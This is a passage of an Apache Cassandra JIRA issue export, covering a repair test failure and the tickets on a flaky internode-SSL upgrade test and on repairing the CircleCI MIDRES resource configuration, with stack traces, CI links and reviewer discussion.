        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.lang.Thread.run(Thread.java:748)
INFO  [node1_Repair-Task:1] node1 2022-04-26 10:41:32,733 [preview repair #590b0fc0-c577-11ec-b392-2548bbd24495]Repair command #7 finished with error
{noformat}

which indicates it should have returned the failure at 10:41:32,733, but this doesn't happen for 5 minutes, and the only thing in node1's log is:

{noformat}
INFO  [node1_Messaging-EventLoop-3-1] node1 2022-04-26 10:42:01,657 /127.0.0.1:7012->/127.0.0.2:7012-URGENT_MESSAGES-[no-channel] failed to connect
io.netty.channel.AbstractChannel$AnnotatedConnectException: Connection refused: /127.0.0.2:7012
Caused by: java.net.ConnectException: Connection refused
        at sun.nio.ch.SocketChannelImpl.checkConnect(Native Method)
        at sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:716)
        at io.netty.channel.socket.nio.NioSocketChannel.doFinishConnect(NioSocketChannel.java:330)
        at io.netty.channel.nio.AbstractNioChannel$AbstractNioUnsafe.finishConnect(AbstractNioChannel.java:334)
        at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:707)
        at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655)
        at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581)
        at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
        at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
        at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
        at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
        at java.lang.Thread.run(Thread.java:748)
{noformat}

until the next test begins. This feels like perhaps something in the dtest framework to me but I'm not sure.  WDYT [~dcapwell] ?;;;","01/Jun/22 14:50;e.dimitrova;[~dcapwell] I noticed you are also the original author of the test, maybe you can bring some light here?;;;","02/Jun/22 17:41;dcapwell;5m feels weird, but likely client... see org.apache.cassandra.tools.NodeProbe#JMX_NOTIFICATION_POLL_INTERVAL_SECONDS

Server:
{code}
if (!prepareLatch.await(getRpcTimeout(MILLISECONDS), MILLISECONDS) || timeouts.get() > 0)
  failRepair(parentRepairSession, ""Did not get replies from all endpoints."");
{code}

our timeout should be based off RPC timeout, or ""request_timeout"" which defaults too 10s.  Here is the list of files which touch this timeout value

{code}
 $ grep -r request_timeout test/distributed/ | awk -F: '{print $1}' | sort -u
test/distributed//org/apache/cassandra/distributed/test/CASAddTest.java
test/distributed//org/apache/cassandra/distributed/test/CASContentionTest.java
test/distributed//org/apache/cassandra/distributed/test/CASMultiDCTest.java
test/distributed//org/apache/cassandra/distributed/test/CASTest.java
test/distributed//org/apache/cassandra/distributed/test/CasCriticalSectionTest.java
test/distributed//org/apache/cassandra/distributed/test/LargeColumnTest.java
test/distributed//org/apache/cassandra/distributed/test/LegacyCASTest.java
test/distributed//org/apache/cassandra/distributed/test/MessageFiltersTest.java
test/distributed//org/apache/cassandra/distributed/test/PaxosRepairTest.java
test/distributed//org/apache/cassandra/distributed/test/PaxosRepairTest2.java
test/distributed//org/apache/cassandra/distributed/test/ReadRepairEmptyRangeTombstonesTest.java
test/distributed//org/apache/cassandra/distributed/test/ReadRepairQueryTester.java
test/distributed//org/apache/cassandra/distributed/test/ReadRepairTest.java
test/distributed//org/apache/cassandra/distributed/test/ring/ReadsDuringBootstrapTest.java
test/distributed//org/apache/cassandra/distributed/upgrade/MixedModeAvailabilityTestBase.java
test/distributed//org/apache/cassandra/distributed/upgrade/MixedModeConsistencyTestBase.java
test/distributed//org/apache/cassandra/distributed/upgrade/MixedModeMessageForwardTest.java
{code}

ForceRepairTest isn't in that list, and it exists TestBaseImpl which also isn't in the list; and the jvm-dtest code doesn't either...


bq. which indicates it should have returned the failure at 10:41:32,733, but this doesn't happen for 5 minutes

I agree, it should fail around that time, did the client side assert match or was it 5m delayed?  I am mostly asking if the cluster took 5m to shutdown or did it take 5m for the client to notice?  org.apache.cassandra.tools.NodeProbe#JMX_NOTIFICATION_POLL_INTERVAL_SECONDS defaults to 5m which means a JMX message was dropped (jmx is lossy), so client noticing repair failed 5m later makes sense as that matches our poll timeout logic; lowering -Dcassandra.nodetool.jmx_notification_poll_interval_seconds would speed up those checks

{code}
stderr:
error: Repair job has failed with the error message: Repair command #2 failed with error Did not get replies from all endpoints.. Check the logs on the repair participants for further details
-- StackTrace --
java.lang.RuntimeException: Repair job has failed with the error message: Repair command #2 failed with error Did not get replies from all endpoints.. Check the logs on the repair participants for further details
	at org.apache.cassandra.tools.RepairRunner.progress(RepairRunner.java:137)
	at org.apache.cassandra.utils.progress.jmx.JMXNotificationProgressListener.handleNotification(JMXNotificationProgressListener.java:77)
	at javax.management.NotificationBroadcasterSupport.handleNotification(NotificationBroadcasterSupport.java:275)
	at javax.management.NotificationBroadcasterSupport$SendNotifJob.run(NotificationBroadcasterSupport.java:352)
	at org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
{code}

If we lower the client poll logic the test should fail faster, but it should still fail.  It looks like a connection issue broke prepare when it wasn't expected, and atm we do not have retry logic in repair (known issue), so failing would be expected behavior atm.;;;","06/Jun/22 14:39;brandon.williams;I think you're right about the poll interval, but I don't think any JMX messages should be lost here.  That said, I can no longer reproduce that failure, but I can now reproduce the original, which may be related.  The crux of that issue is that sometimes we can win the race and beat the failure detector to marking node2 down when we force the repair, which then correctly fails.  I have a branch that ensures node2 is marked down before proceeding:

||Branch||CI||
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17655-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/510/workflows/89d3d809-3f27-4085-9064-661ba1af16e2], [J11|https://app.circleci.com/pipelines/github/driftx/cassandra/510/workflows/fbec3999-1ca2-4ec3-b691-caf7a834fffd], [+500|https://app.circleci.com/pipelines/github/driftx/cassandra/510/workflows/fbec3999-1ca2-4ec3-b691-caf7a834fffd/jobs/5917]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17655-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/512/workflows/eb4f1761-5777-4136-a21b-86fa38671aec], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/512/workflows/a72d1336-ad51-46d2-937c-0f7874e533bd], [+500|https://app.circleci.com/pipelines/github/driftx/cassandra/512/workflows/a72d1336-ad51-46d2-937c-0f7874e533bd/jobs/5909]|

And an unpatched [500 run|https://app.circleci.com/pipelines/github/driftx/cassandra/511/workflows/9c5061c9-46ac-4fb6-82ed-d6116140a97f/jobs/5927] for comparison.;;;","06/Jun/22 21:52;dcapwell;LGTM +1;;;","07/Jun/22 10:47;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix test_parallel_upgrade_with_internode_ssl,CASSANDRA-17565,13440714,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,20/Apr/22 15:09,16/Dec/22 21:54,13/Jul/23 08:40,24/May/22 11:19,4.0.5,4.0-beta1,4.1,4.1-beta1,,,CI,,,,0,,"While working on CASSANDRA-17341 I hit this flaky test, very rarely failing but it is failing on trunk.

More info in this CI run:

https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1563/workflows/61bda0b7-f699-4897-877f-c7d523a03127/jobs/10318",,bereng,e.dimitrova,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 24 11:19:14 UTC 2022,,,,,,,All,,,,"0|z11n2w:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/7ea24711cc10dd4d846427f76c30c347cbdf3d26,,,,,,,,,run CI,,,,,"20/Apr/22 15:10;e.dimitrova;CC [~brandon.williams] :) ;;;","20/Apr/22 20:13;brandon.williams;This is similar to CASSANDRA-16277 but the connection is further along.  [Branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17565] to silence the error and [4000 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/443/workflows/f7abfc54-4f1d-4415-b4d3-0b00984be262/jobs/5182] in circle...but that didn't work, so ignore this.;;;","21/Apr/22 11:05;brandon.williams;bq. but that didn't work, so ignore this.

To clarify, there are 7 failures in that run, but 6 were git errors and one was legit.

Not trusting the results, I did another [4000 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/443/workflows/8e7a307a-4a13-4c00-ab45-ca65b48ac602/jobs/5184] and got one failure again...however, examining the line number, that has to be from the 4.0 side, and indeed it needs the same patch.  But now the question is, can the upgrade test be run with both a custom 4.0 and trunk branch?  If not, perhaps this is enough to commit the trunk side, and then we can run 4k with a custom 4.0 branch against it, which should prove out the whole thing.;;;","21/Apr/22 16:07;brandon.williams;Here are the branches and precommit CI on circle:

||Branch||Precommit CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/447/workflows/d512f2ec-d340-4075-9c3c-22099d23c73c], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/447/workflows/5a5204f5-fa28-40b0-9f56-64765601999f]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/446/workflows/6796d66c-c1db-4a32-80cf-d069100fe19a], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/446/workflows/cf5c2d25-274e-4821-91dc-aabf9c5ad986]|
;;;","12/May/22 15:15;e.dimitrova;Triaging and found this one, should we move it to patch available?;;;","12/May/22 16:06;brandon.williams;No, this breaks the handleCorruptionOfLargeMessageFrame test.  I'll come back to this at some point and investigate.;;;","16/May/22 21:31;brandon.williams;This actually did not break that test, it's a flaky: CASSANDRA-17630.  It was previously overshadowed in butler by being linked to the CASSANDRA-17321 umbrella ticket, but I've broken it out.

I'll get this upgrade test run against both branches together in circle.;;;","17/May/22 16:30;brandon.williams;bq. I'll get this upgrade test run against both branches together in circle.

Nevermind, upgrade_through_versions.py is not ready to handle custom branches easily.  Marking patch available.;;;","19/May/22 05:13;bereng;I think you can do multiple custom branches in upgrade tests. At least I think I did by tweaking [this|https://github.com/blerer/cassandra-dtest/blob/master/upgrade_tests/upgrade_manifest.py#L125]. Do you want to give it a try or should we go ahead with this one?

Also another trick is to replace the the versions ccm caches locally with whatever build you actually want. It's somewhere under ~/.ccm iirc;;;","19/May/22 16:29;brandon.williams;Ah thanks, I'd looked in the manifest before but missed that spot so the link really helped.  I've got it running in circle [here|https://app.circleci.com/pipelines/github/driftx/cassandra/492/workflows/f07ccd12-6c4b-4a2e-97d2-873ab943ee4a].;;;","20/May/22 05:58;bereng;It looks good, latest CI is greeeeeen but we seem to have 4.0 and trunk patches, wouldn't we need 4.1 also?;;;","20/May/22 10:26;brandon.williams;Yep, this ticket has bridged that gap now so it needs addressing.

||Branch||Precommit CI||
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-4.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/447/workflows/d512f2ec-d340-4075-9c3c-22099d23c73c], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/447/workflows/5a5204f5-fa28-40b0-9f56-64765601999f]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/494/workflows/1523158a-2abc-49f8-83e0-2ac90f811e2c], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/494/workflows/d7744d75-f7b2-4d8c-8d89-f22c22a4c34d]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/446/workflows/6796d66c-c1db-4a32-80cf-d069100fe19a], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/446/workflows/cf5c2d25-274e-4821-91dc-aabf9c5ad986]|

||Upgrades||Circle||
|indev_4_0_x_To_indev_4_1_x|[500 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/496/workflows/45bb64a0-183e-4b1f-8a24-789bc77222cb]|
|indev_4_0_x_To_indev_trunk|[500 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/492/workflows/f07ccd12-6c4b-4a2e-97d2-873ab943ee4a]|
|indev_4_1_x_To_indev_trunk|[500 runs|https://app.circleci.com/pipelines/github/driftx/cassandra/495/workflows/79b91e06-8e71-4c25-90e5-0fc8a576879e]|

Note that I had to add indev_4_1_x to indev_trunk since 4.1 had no upgrades in the manifest.  I can address this in CASSANDRA-17645.


;;;","23/May/22 05:46;bereng;Trunk dtests look broken, but that is strange bc everything else is green. Maybe re-run trunk in hope it was some env issue?;;;","23/May/22 10:51;brandon.williams;Strange indeed, and circle is [being strange again|https://app.circleci.com/pipelines/github/driftx/cassandra/446/workflows/be2bcaaa-e0a5-40ae-88e2-8e220fb35446] so I'm going back to [old faithful|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1733/].;;;","23/May/22 14:15;brandon.williams;I think what happened is the new docker image kicked in for trunk and I needed a rebase, which is [here|https://github.com/driftx/cassandra/tree/CASSANDRA-17565-trunk] with [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/498/workflows/543edd8b-1ea3-46b3-b5d3-1cc8ba958999] and [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/498/workflows/2ac764c5-7a06-4951-83c2-a91db03ae0f6].;;;","24/May/22 07:58;bereng;Ok yep, the new trunk run LGTM. +1.;;;","24/May/22 11:19;brandon.williams;Committed, thank you.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix CircleCI Midres config,CASSANDRA-17563,13440541,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,,e.dimitrova,e.dimitrova,19/Apr/22 22:41,27/May/22 19:25,13/Jul/23 08:40,04/May/22 16:08,4.1,4.1-alpha1,,,,,CI,,,,0,,"During CircleCI addition of a new job to the config, the midres file got messy. Two of the immediate issues (but we need to verify all jobs will use the right executors and resources):
 * the new job needs to use higher parallelism as the original in-jvm job
 *  j8_dtests_with_vnodes should get from midres 50 large but currently midres makes it run with 25 and medium which fails around 100 tests",,adelapena,benedict,bereng,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17332,CASSANDRA-17600,,,,,,,,,,,,,,,,,,,0.0,dcapwell,e.dimitrova,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 04 22:41:14 UTC 2022,,,,,,,All,,,,"0|z11m14:",9223372036854775807,,,,adelapena,e.dimitrova,jmckenzie,,Critical,,4.0,,https://github.com/apache/cassandra/commit/523d38095f6c7f33c602616db3a7373bbeb0cde9,,,,,,,,,"validated the diff matches resources as of commit 20175bf77e2c6f72c25240ee445b583805a37630, before the vnode changes were merged",,,,,"19/Apr/22 22:43;e.dimitrova;I identified the issue with trunk but we need to check all branches where the breaking config was committed.

CC [~dcapwell] ;;;","20/Apr/22 18:10;dcapwell;MIDRES: https://app.circleci.com/pipelines/github/dcapwell/cassandra/1367/workflows/43edfcf2-229f-4650-874b-bc1faccf77af;;;","20/Apr/22 18:21;dcapwell;MIDRES attempt 2 (missing new script): https://app.circleci.com/pipelines/github/dcapwell/cassandra/1368/workflows/41c514ca-1435-4e71-b808-f848b375b268;;;","20/Apr/22 18:40;e.dimitrova;* ""highers"" should be ""highres"" everywhere, same ""lowers"" should be ""lowres""
 * I believe there is some forgotten commented out code
 * we need to update readme
 * we need to verify all branches
 * we need to verify this works smoothly also with highres

These are immediate comments. I will check in detail the midres config after CI shows good results. By the way the new link leads to a canceled CI run;;;","20/Apr/22 18:44;dcapwell;don't know why but attempt 2 wasn't on the updated commit, 

MIDRES attempt 3: https://app.circleci.com/pipelines/github/dcapwell/cassandra/1370/workflows/96cb49ae-1bad-4412-a04a-3431a66cd641;;;","20/Apr/22 21:01;dcapwell;[~e.dimitrova], [~Bereng], [~brandonwilliams] mind reviewing?  You are all familiar with circle ci so value your feedback

MIDRES: https://app.circleci.com/pipelines/github/dcapwell/cassandra/1372/workflows/942cf870-c90d-4a29-ab97-b335caf2d08f;;;","20/Apr/22 21:02;dcapwell;[~jmckenzie] cc;;;","20/Apr/22 21:05;dcapwell;Created a script to dump the resources (type + parallel) for each job, used this to diff old configs to make sure they matched; below is the output as of 20175bf77e2c6f72c25240ee445b583805a37630 (before vnode patch)

{code}
$ diff midres.resources midres.resources.new
9a10
> j11_jvm_dtests_vnode  medium  10
22a24
> j8_jvm_dtests_vnode   large   10
(CASSANDRA-17563) $ diff higher.resources higher.resources.new
9a10
> j11_jvm_dtests_vnode  xlarge  5
22a24
> j8_jvm_dtests_vnode   xlarge  5
{code};;;","20/Apr/22 21:06;brandon.williams;cc [~adelapena];;;","20/Apr/22 21:10;dcapwell;marking 4.1 as I broke trunk, so need to fix so CI works for everyone;;;","21/Apr/22 10:07;bereng;[~dcapwell] I am in the middle of sthg but I will try to look into this asap;;;","21/Apr/22 14:54;e.dimitrova;My previous point still stands that we need to be sure everything on all branches works as before. 

IMHO what we really need to see is that every new highres and midres on every branch has only an addition of a new job in_jvm which match as resource usage the old single in_jvm job and no other changes applied. 

Thanks for all the updates and adding the docs, etc. I understand and really appreciate your good intentions for improvement and ease of maintenance. Unfortunately, I have a few immediate concerns w which make me think we need to have immediate fix for midres and rewrites of the scripts after the release:
 * There are changes to the other generate.sh script I haven't looked at but any change there need to be tested that it didn't break any of the options added and tested one by one by [~adelapena] 
 * My concern is we don't know who was using what and how and it was working fine for quite some time. Do we want to rewrite the whole approach one week before freeze when people highly utilize CI to push their latest work? What do others think?
 * Also, now we will have a mix of python and shell scripts, are we sure the community will accept that? 

I really like and appreciate how you added diff but I am confused  from the output what I am seeing actually. I see the new name and resource change.

 ;;;","21/Apr/22 17:31;dcapwell;bq.  has only an addition of a new job in_jvm which match as resource usage the old single in_jvm job and no other changes applied.

Currently this is a massive amount of manual work to confirm, and there isn't a good source of truth to compare against; this patch moves the source of truth into a map so we know what happens (if you don't update you get default for the level, else you add an override)

We talked about this a lot in slack, and my personal feeling is every step in a manual process is another chance for error, so the more steps done the higher risk to do it incorrectly; the current process as I can find is the following

1) create config-2_1.yml.MIDRES and config-2_1.yml.HIGHER using the current patches
2) update config-2_1.yml with your change
3) update config-2_1.yml.MIDRES with your change, and figure out how to apply the updated resources
4) update config-2_1.yml.HIGHER with your change and figure out how to apply the updated resources (method does not match step 3, so the ""how"" is different here)
5) generate diff for MIDRES and update patch
6) generate diff for HIGHER and update patch
7) test LOWER - success is defined as ""what failed before is the only thing failing now""
8) test MIDRES - success is defined as ""what failed before is the only thing failing now""
9) test HIGHER - success is defined as ""what failed before is the only thing failing now""

did I miss anything?

bq. There are changes to the other generate.sh script I haven't looked at but any change there need to be tested

given there are 0 tests for the script, 2 different people ""testing"" could yield different results, so we would need to have some way to define success that is agreed upon.  

For example, I fixed what I saw was a bug, when you ask it to generate LOWER, MIDRES, or HIGHER it doesn't actually update those files and instead only updates config.yml; the help page says this but to me this is unexpected behavior

-a updates config.yml.LOWER, config.yml.MIDRES, and config.yml.HIGHER,
-h updates config.yml only!

I am totally cool with -h updating config.yml as well, but it feels like a bug that config.yml.HIGHER isn't updated... so my patch changing that... which one of us is the bug?

Now, if we want to define it as ""they did the same thing regardless of personal feelings about correct behavior"" then I do know for a fact my patch is different; I am 100% ok reverting that difference

bq. My concern is we don't know who was using what and how and it was working fine for quite some time

I feel like a politician... can you define the word ""what""?

bq. Do we want to rewrite the whole approach one week before freeze when people highly utilize CI to push their latest work?

the core change is moving away from patch to modifying the yaml tree; there are other changes but those are personal preference and 100% fine to drop... 

To me I ask the following question ""if you yaml diff the old and new files, are there a difference?"" if the answer is no, then there isn't much of a risk other than the script not working on an unknown laptop (which impacts generate.sh only, not CI configs).

Now, if you want to de-risk that, we could use this script to generate the patches, but we don't solve the real problem of patches applying when they shouldn't (which is how I broke MIDRES).  If we want to do that to lower risk before 4.1 freeze I am cool with that, but do not think that is a valid long term solution

bq. now we will have a mix of python and shell scripts, are we sure the community will accept that? 

that is something anyone who touches this needs to answer, which is why I tried to pull in anyone who touched this logic to get their feedback.  I do know that many in the community basically do this already (can tell by looking at circle ci as my private scripts rename things and cleanup our DAG), so its just moving part of that private logic into OSS to help maintain these files.

bq. I really like and appreciate how you added diff but I am confused  from the output what I am seeing actually. I see the new name and resource change.

do you mean the output of the dump of what each job's resource is?

{code}
$ diff midres.resources midres.resources.new
9a10
> j11_jvm_dtests_vnode  medium  10
22a24
> j8_jvm_dtests_vnode   large   10
{code}

so this is diff output, so "">"" means that the right-hand-side has the following, but there is no matching on the left hand side... aka ""new job""

you see that MIDRES j8 and j11 do not have matching resources!  This is because they don't now (as defined before the vnode patch), so I am pointing out that j11 and j8 run with different resources on MIDRES and that I am not changing that behavior in this patch (more than glad to if you desire)

{code}
j11_jvm_dtests  medium  10
j11_jvm_dtests_vnode  medium  10
j8_jvm_dtests large 10
j8_jvm_dtests_vnode large 10
{code}

they match in HIGHER but not MIDRES, I do not know if there was a reason for this before so I left it to be true still.;;;","21/Apr/22 19:29;dcapwell;Speaking with [~e.dimitrova] in slack, I moved the patch to not touch generate.sh and instead the scripts are used to create the patches (created script to create the patches and updated docs to show how);;;","21/Apr/22 19:44;e.dimitrova;Thanks, so now everything will be the same in the setup, [~dcapwell] only adds a tool to help to create new patches with minimum efforts. If someone prefers to do it manually - that is fine. In all cases we need to verify after that the generated MIDRES and HIGHRES files have exactly what we want for ""happy"" CI :D 

The only thing to be mentioned is that the tool might rearrange the attributes, so if someone feels bad about that, they can just use the old way and skip seeing those rearrangements being just additional noise. ;;;","27/Apr/22 16:04;jmckenzie;When I diff MIDRES pre and post {{20175bf77e2c6f72c25240ee445b583805a37630}} I get the following (along with vnode in-jvm changes I'd expect):
{code:java}
-          set -eo pipefail && circleci tests glob ""$HOME/cassandra/test/distributed/**/*.java"" ""$HOME/cassandra/test/simulator/test/**/*.java"" > /tmp/all_java_unit_tests.txt
+          set -eo pipefail && circleci tests glob ""$HOME/cassandra/test/distributed/**/*.java"" > /tmp/all_java_unit_tests.txt
{code}
Is this change (dropping simulator tests from all test enumeration, assuming I'm understanding this correctly) intentional?;;;","27/Apr/22 16:43;e.dimitrova;They should be returned too. Only change from that patch should be adding the new in-jvm job with resources matching the ones used for the original in-jvm job on every level - lowres, midres and highres;;;","27/Apr/22 19:11;jmckenzie;bq. Only change from that patch should be adding the new in-jvm job
There's quite a bit more going on in [this PR|https://github.com/apache/cassandra/pull/1579] than a simple revert of resource allocation in midres. What am I reviewing here? :);;;","28/Apr/22 12:03;e.dimitrova;[~dcapwell] raised the point that the current way to update these resource files is error-prone and he suggested also a new tool with the idea that it can help prevent such mistakes in the future.

I feel that there was more of misunderstanding around what MIDRES is and that it is not just a matter of up and down the resources, there are also different executors as the idea behind that file was tuned usage of resources, while HIGHRES is just bump to the max as far as I know. Also no matter of any automations, apply a clean patch should be considered as - content also verified by a human (more or less as every patch we work in), not only apply patch without failure. If this is ambiguous - let's update the readme. 

I am all in for improvements but I think we can split at this point the work at least in two commits - one to urgently fix MIDRES so people stop looking for workarounds, abuse their credits with HIGHRES or troubleshoot why they see 100 python tests failing before the freeze.

And the other one we can continue reviewing - the supplemental tool.

I already said what I want to see - only addition of a new job as per the intentions of CASSANDRA-17332 

If [~dcapwell] doesn't have the time, I suggest again I do at least the fix as this config is really important. ;;;","28/Apr/22 12:08;brandon.williams;bq. I am all in for improvements but I think we can split at this point the work at least in two commits - one to urgently fix MIDRES so people stop looking for workarounds, abuse their credits with HIGHRES or troubleshoot why they see 100 python tests failing before the freeze.

I agree that bringing MIDRES back to a functioning state like before should be the priority, this was our default configuration and used heavily.;;;","28/Apr/22 12:19;adelapena;+1 to fix MIDRES as soon as possible and do the improvements in a separate followup ticket. That way those of us using MIDRES will be able to not use more resources than intended, especially since we are close to a release.;;;","28/Apr/22 15:49;dcapwell;bq. Is this change (dropping simulator tests from all test enumeration, assuming I'm understanding this correctly) intentional?

[~jmckenzie] they were removed in the vnode patch, I spoke with [~benedict] and the patch manually modified the config.yml* files and not config-2.1.yml due to confusion; the simulator tests were not added at the time so that statement was a no-op

It wasn't intentional as it was done by running ""generate.sh -a""; I feel this should be fixed in a patch to enable simulator tests, I don't see the benefit to have it as its dead code atm.

bq. If David Capwell doesn't have the time, I suggest again I do at least the fix as this config is really important. 

I have 0 issue taking the patch from this and making its own commit, but I do have concerns for me to manually create a new MIDRES as that thing I found out the hard way is brittle; hence this patch.  If you [~e.dimitrova] are confident I am ok with you fixing the patch, but I am not confident about doing it myself.;;;","28/Apr/22 16:03;e.dimitrova;I will fix the midres for all branches tonight, at latest tomorrow morning. It needs to be revised/fixed on all branches.

Shall we open a ticket for the simulator tests to be revised and added everywhere?;;;","28/Apr/22 16:04;benedict;Yes, I will enable them in another patch - there is an outstanding ticket fixing a bug with Paxos_v2 that will address this.;;;","28/Apr/22 16:05;e.dimitrova;Great, thanks! :) ;;;","28/Apr/22 16:21;jmckenzie;bq. I do have concerns for me to manually create a new MIDRES as that thing I found out the hard way is brittle; hence this patch. 
100% agree; hence my feedback about us making the UX a little clearer / smoother for folks so the scripted creation becomes the One True Way going forward.

Breaking out the ""revert MIDRES to working state"" from ""make this less brittle going forward"" gets a conceptual / philosophical +1 from me.;;;","30/Apr/22 01:25;e.dimitrova;For the record, this was a merge patch but the midres changes were done only for trunk. No issue with previous branches.

Also,  noticed all in_jvm for midres have to be large, p10. J11 was left medium. Checked the old records where large was decided. 

So the current patch reverts the two additional changes we see in MIDRES after adding the new job plus raise to large the J11 in_jvm.

[Patch|https://github.com/ekaterinadimitrova2/cassandra/pull/new/CASSANDRA-16677-trunk], [CI| https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=CASSANDRA-16677-trunk&filter=all] just started;;;","30/Apr/22 01:28;e.dimitrova;How I fixed it: applied the midres patch to  the config file before [~dcapwell]'s patch and then applied his patch (check the new jobs with the old in_jvm that they use same resources), then recreated the patch with diff and created the MIDRES file. Visual double-check to see only what I want was applied. :-) Plus quick compare with his changes;;;","30/Apr/22 19:19;adelapena;The latter patch fixing the patch and MIDRES looks good to me, +1. Good catch on the usage of {{medium}} in {{{}j11_jvm_dtests{}}}, I think that particular one is also wrong in 4.0, where j8 uses {{large}} and j11 uses {{{}medium{}}}.;;;","01/May/22 20:43;e.dimitrova;Thank you for the quick review! I see [~mck] opened a ticket for the branching with a lot of tasks so I will hold off committing this one until tomorrow to ensure I don’t interrupt him. 
About 4.0 - yes, I will fix it with another ticket I have for moving the circle config images to be  listed with “latest” tag, same as Jenkins, so we don’t have to update every time there is a new test image pushed. I can do it later this week. ;;;","03/May/22 21:11;e.dimitrova;Now when the CI and branches are back on track, I am going to rebase and run again the patch with our brand new cassandra-4.1 and trunk. Commit pending CI

[4.1|https://github.com/apache/cassandra/compare/cassandra-4.1...ekaterinadimitrova2:16677-4.1?expand=1] | [CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=16677-4.1&filter=all]

[trunk |https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:trunk-17589?expand=1]| [CI| https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=trunk-17589&filter=all];;;","04/May/22 00:59;e.dimitrova;The usual suspects... nothing new and related to this patch or the branching as issue.

I will commit it soon. Then wen can move back to discussing the newly suggested scripts.;;;","04/May/22 01:15;e.dimitrova;Committed to cassandra-4.1 -> https://github.com/apache/cassandra/commit/523d38095f6c7f33c602616db3a7373bbeb0cde9

